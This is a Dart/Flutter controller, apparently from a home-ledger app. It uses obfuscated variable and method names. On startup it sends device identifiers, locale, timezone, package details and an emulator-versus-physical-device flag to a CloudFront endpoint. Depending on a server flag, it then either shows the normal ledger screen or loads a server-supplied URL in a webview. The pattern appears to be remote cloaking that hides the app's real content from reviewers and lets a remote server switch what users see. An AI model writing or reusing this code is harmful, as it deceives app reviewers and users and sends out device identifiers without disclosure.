import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class HomeLedgerTranslateLogic extends GetxController {

  var bihpcxzlkr = RxBool(false);
  var jzeuyxlig = RxBool(true);
  var npztr = RxString("");
  var kqtel = RxBool(false);
  var qlpszvaf = RxBool(true);
  final hefoqy = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    qcpbda();
  }


  Future<void> qcpbda() async {
    kqtel.value = true;
    qlpszvaf.value = true;
    jzeuyxlig.value = false;

    hefoqy.post("https://d1e7hpivw3b9lx.cloudfront.net/ypnvtmilr",data: await tvfzgusj()).then((value) {
      var nwpl = value.data["nwpl"] as String;
      var rwljp = value.data["rwljp"] as bool;
      if (rwljp) {
        npztr.value = nwpl;
        eujshp();
      } else {
        apvc();
      }
    }).catchError((e) {
      jzeuyxlig.value = true;
      qlpszvaf.value = true;
      kqtel.value = false;
    });
  }

  Future<Map<String, dynamic>> tvfzgusj() async {
    final DeviceInfoPlugin ohjk = DeviceInfoPlugin();
    PackageInfo dhxj_mzdrbk = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xghnkjw = Platform.localeName;
    var jvqzfk_shAgRG = currentTimeZone;

    var jvqzfk_rbHPIqxy = dhxj_mzdrbk.packageName;
    var jvqzfk_ZgrIQCV = dhxj_mzdrbk.version;
    var jvqzfk_hlV = dhxj_mzdrbk.buildNumber;

    var jvqzfk_VrFO = dhxj_mzdrbk.appName;
    var jvqzfk_BAOtWNlh = "";
    var jvqzfk_RGdVX  = "";
    var jvqzfk_VwS = "";
    var dwkjhc = "";
    var yzrdatls = "";
    var utqysf = "";
    var gdinyeu = "";
    var mwfzex = "";
    var bjgmew = "";
    var scdgt = "";


    var jvqzfk_lNSgObsI = "";
    var jvqzfk_DKSUmG = false;

    if (GetPlatform.isAndroid) {
      jvqzfk_lNSgObsI = "android";
      var yarhxbj = await ohjk.androidInfo;

      jvqzfk_VwS = yarhxbj.brand;

      jvqzfk_BAOtWNlh  = yarhxbj.model;
      jvqzfk_RGdVX = yarhxbj.id;

      jvqzfk_DKSUmG = yarhxbj.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      jvqzfk_lNSgObsI = "ios";
      var dvmuzsth = await ohjk.iosInfo;
      jvqzfk_VwS = dvmuzsth.name;
      jvqzfk_BAOtWNlh = dvmuzsth.model;

      jvqzfk_RGdVX = dvmuzsth.identifierForVendor ?? "";
      jvqzfk_DKSUmG  = dvmuzsth.isPhysicalDevice;
    }
    var res = {
      "jvqzfk_VrFO": jvqzfk_VrFO,
      "jvqzfk_hlV": jvqzfk_hlV,
      "jvqzfk_ZgrIQCV": jvqzfk_ZgrIQCV,
      "utqysf" : utqysf,
      "jvqzfk_rbHPIqxy": jvqzfk_rbHPIqxy,
      "jvqzfk_shAgRG": jvqzfk_shAgRG,
      "jvqzfk_VwS": jvqzfk_VwS,
      "jvqzfk_RGdVX": jvqzfk_RGdVX,
      "xghnkjw": xghnkjw,
      "jvqzfk_lNSgObsI": jvqzfk_lNSgObsI,
      "dwkjhc" : dwkjhc,
      "jvqzfk_BAOtWNlh": jvqzfk_BAOtWNlh,
      "yzrdatls" : yzrdatls,
      "gdinyeu" : gdinyeu,
      "mwfzex" : mwfzex,
      "jvqzfk_DKSUmG": jvqzfk_DKSUmG,
      "bjgmew" : bjgmew,
      "scdgt" : scdgt,

    };
    return res;
  }

  Future<void> apvc() async {
    Get.offNamed("/home_ledger_tab");
  }

  Future<void> eujshp() async {
    Get.offNamed("/home_ledger_touch");
  }

}
